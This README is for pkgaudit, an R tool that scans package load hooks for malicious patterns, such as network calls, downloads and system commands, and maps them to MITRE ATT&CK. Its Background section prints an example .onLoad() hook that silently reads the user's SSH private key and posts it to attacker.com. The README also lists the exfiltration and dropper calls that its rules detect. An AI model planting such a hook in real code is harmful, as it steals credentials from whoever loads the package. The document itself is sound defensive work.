# pkgaudit

[![R-CMD-check](https://github.com/tylerjssmith/pkgaudit/actions/workflows/R-CMD-check.yaml/badge.svg)](https://github.com/tylerjssmith/pkgaudit/actions/workflows/R-CMD-check.yaml)

pkgaudit provides static analysis security testing (SAST) for R packages. It searches R source code for possibly malicious patterns and, if found, returns the results with a clear explanation of the pattern and its relationship to the [MITRE ATT&CK](https://attack.mitre.org/) framework of adversary tactics and techniques.

## Background

R is a statistical programming language widely used in environments processing sensitive data: clinical trial analyses, government statistics, financial risk modeling, academic research, and more. 

R packages are the primary mechanism for sharing R code. They are also potential attack vectors. When a user calls `install.packages()` or `library()`, for example, R automatically executes any code in hooks like `.onLoad()` and `.onAttach()`. A malicious or compromised package can run arbitrary code on the user's system without any action beyond the normal R workflow.

A minimal example of what a malicious `.onLoad()` hook might look like is:

``` r
.onLoad <- function(libname, pkgname) {
  tryCatch({
    key <- readLines("~/.ssh/id_rsa")
    httr::POST("https://attacker.com/collect",
               body = list(key = paste(key, collapse = "\n")))
  }, error = function(e) invisible(NULL))
}
```

This code reads the user's SSH private key and sends it to an external server whenever the package is loaded. The `tryCatch()` wrapper suppresses any errors, so the package loads normally and the user sees nothing unusual.

This is not a theoretical risk. The same attack pattern has been documented repeatedly in ecosystems adjacent to R. In 2022, the Python package ctx on PyPI was compromised to exfiltrate environment variables — including cloud credentials — from data scientists' systems. In 2024, the Python package ultralytics, a widely used computer vision library, was compromised to distribute a cryptominer to its users.

pkgaudit aims to provide one layer of defense against an underappreciated risk. A pkgaudit finding does not necessarily indicate malicious code, but prospective users should review flagged code prior to running it.

## Threat Model

R's use in environments handling sensitive data makes it an attractive target for a broad range of threat actors. The assets at risk include both the data processed in R sessions and the underlying systems on which R runs, which provide compute resources and credentials for lateral movement. pkgaudit currently focuses on lifecycle hooks (`.onLoad()`, `.onAttach()`) as the primary attack surface because code in these hooks executes automatically when a package is loaded.

## Rule Coverage

All rules in v0.2.0 target calls inside `.onLoad()` or `.onAttach()` hooks. Calls to the same functions outside these hooks are not flagged.

| Category | Rule | Pattern |
|---|---|---|
| Command Execution | [onload_calls_system_rule](inst/rules/onload_calls_system_rule.yaml) | `system()`, `system2()` |
| Dropper | [onload_download_file_rule](inst/rules/onload_download_file_rule.yaml) | `download.file()` |
| | [onload_calls_source_rule](inst/rules/onload_calls_source_rule.yaml) | `source()` |
| Exfiltration | [onload_calls_curl_rule](inst/rules/onload_calls_curl_rule.yaml) | `curl::curl_fetch_memory()`, `curl::curl_fetch_disk()`, `curl::curl_fetch_stream()`, `curl::curl_download()`, `curl::multi_run()` |
| | [onload_calls_httr_rule](inst/rules/onload_calls_httr_rule.yaml) | `httr::GET()`, `httr::POST()`, `httr::PUT()`, `httr::PATCH()`, `httr::DELETE()`, `httr::HEAD()`, `httr::VERB()` |
| | [onload_calls_httr2_rule](inst/rules/onload_calls_httr2_rule.yaml) | `httr2::req_perform()`, `httr2::req_perform_parallel()`, `httr2::req_perform_sequential()`, `httr2::req_stream()` |
| | [onload_calls_rcurl_rule](inst/rules/onload_calls_rcurl_rule.yaml) | `RCurl::getURL()`, `RCurl::getURI()`, `RCurl::getForm()`, `RCurl::postForm()`, `RCurl::curlPerform()` |
| Obfuscation | [onload_eval_parse_rule](inst/rules/onload_eval_parse_rule.yaml) | `eval()` + `parse()` |
| Supply Chain | [onload_options_repos_rule](inst/rules/onload_options_repos_rule.yaml) | `options(repos = ...)` |

Qualified (`pkg::fn()`) and unqualified (`fn()`) call forms are both detected.

## Installation

You can install pkgaudit as follows:

``` r
remotes::install_github("tylerjssmith/pkgaudit")
```

## Database Integrity

pkgaudit detects patterns using a SQLite database of rules shipped with the package at `inst/db/rules.db`. To verify that your installed copy of the database has not been modified since publication, check its SHA-256 hash against the value published here:

``` r
digest::digest(
  system.file("db", "rules.db", package = "pkgaudit"),
  algo = "sha256",
  file = TRUE
)
```
Expected SHA-256: `43d937510e3879908b5698d267702f58d8e64f5b91254ca7e855702f54a1edcd`

The hash is regenerated automatically by `inst/scripts/build_rules.R` whenever the database is rebuilt and should match the value above exactly.

## Usage

A file may be scanned as follows:

``` r
library(pkgaudit)
rules    <- load_rules()
findings <- audit_package("path/to/package", rules = rules)

# Record the rules version for reproducibility
attr(findings, "rules_version") <- rules_version()
```




